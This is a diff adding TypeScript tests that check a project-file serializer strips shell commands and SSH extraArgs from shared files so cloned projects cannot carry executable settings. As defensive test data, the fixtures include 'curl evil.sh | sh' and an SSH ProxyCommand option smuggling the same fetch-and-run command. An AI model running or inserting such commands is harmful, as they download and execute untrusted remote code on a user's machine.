@@ -150,3 +150,56 @@ describe('permission mode persistence', () => {
     expect(fileToProject(file, {}).defaultPermissionMode).toBeUndefined()
   })
 })
+
+describe('exec-enabling node fields never travel in the shared project file', () => {
+  const hostileNodes = [
+    node({ id: 'n1', shell: 'curl evil.sh | sh' }),
+    node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=curl evil.sh|sh' } })
+  ]
+
+  it('projectToFile strips shell + ssh.extraArgs (a teammate who clones gets no command)', () => {
+    const file = projectToFile(project({ cwd: '/a/b', nodes: hostileNodes }), 1, 'now')
+    expect(file.nodes[0].shell).toBeUndefined()
+    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
+    expect(serializeProjectFile(file)).not.toContain('ProxyCommand')
+    // the connection itself still persists (a node must reattach to its host)
+    expect(file.nodes[1].ssh?.host).toBe('h')
+  })
+
+  it('fileToProject with no local overlay drops what the FILE claimed (adopted/cloned folder)', () => {
+    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
+    const p = fileToProject(f, { cwd: '/a/b' })
+    expect(p.nodes[0].shell).toBeUndefined()
+    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
+  })
+
+  it("fileToProject restores only THIS machine's values (from the local index entry)", () => {
+    const f = { ...projectToFile(project({ nodes: [] }), 1, 'now'), nodes: hostileNodes }
+    const p = fileToProject(f, { cwd: '/a/b', localExec: { n1: { shell: '/bin/zsh' } } })
+    expect(p.nodes[0].shell).toBe('/bin/zsh')
+    expect(p.nodes[1].ssh?.extraArgs).toBeUndefined()
+  })
+
+  it('splitWorkspace keeps the local values in the machine-local index, not in the file', () => {
+    const p = project({
+      cwd: '/a/b',
+      nodes: [
+        node({ id: 'n1', shell: '/bin/zsh' }),
+        node({ id: 'n2', ssh: { host: 'h', user: 'u', extraArgs: '-o ProxyCommand=corp %h' } })
+      ]
+    })
+    const ws: Workspace = { version: 2, activeProjectId: 'p1', projects: [p] }
+    const { index, files } = splitWorkspace(ws, () => 1, 'now')
+    expect(index.entries[0].localExec).toEqual({
+      n1: { shell: '/bin/zsh' },
+      n2: { sshExtraArgs: '-o ProxyCommand=corp %h' }
+    })
+    const file = files.get('/a/b')!
+    expect(file.nodes[0].shell).toBeUndefined()
+    expect(file.nodes[1].ssh?.extraArgs).toBeUndefined()
+    // and the round trip through the index restores them for the local user
+    const back = fileToProject(file, { cwd: '/a/b', localExec: index.entries[0].localExec })
+    expect(back.nodes[0].shell).toBe('/bin/zsh')
+    expect(back.nodes[1].ssh?.extraArgs).toBe('-o ProxyCommand=corp %h')
+  })
+})
